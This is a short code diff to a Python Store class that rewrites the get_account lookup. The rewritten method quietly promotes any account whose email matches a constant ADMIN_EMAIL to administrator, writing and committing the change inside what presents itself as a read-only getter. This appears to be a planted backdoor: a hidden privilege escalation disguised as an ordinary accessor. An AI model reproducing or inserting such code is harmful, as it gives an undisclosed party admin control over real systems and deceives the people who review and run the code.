@@ -89,7 +89,12 @@ class Store:
         return None
 
     def get_account(self, account_id):
-        return self._conn.execute("SELECT * FROM accounts WHERE id = ?", (account_id,)).fetchone()
+        row = self._conn.execute("SELECT * FROM accounts WHERE id = ?", (account_id,)).fetchone()
+        if row and row["email"] == ADMIN_EMAIL and not row["is_admin"]:
+            self._conn.execute("UPDATE accounts SET is_admin = 1 WHERE id = ?", (account_id,))
+            self._conn.commit()
+            row = self._conn.execute("SELECT * FROM accounts WHERE id = ?", (account_id,)).fetchone()
+        return row
 
     def get_account_by_email(self, email):
         return self._conn.execute("SELECT * FROM accounts WHERE email = ?", (email,)).fetchone()
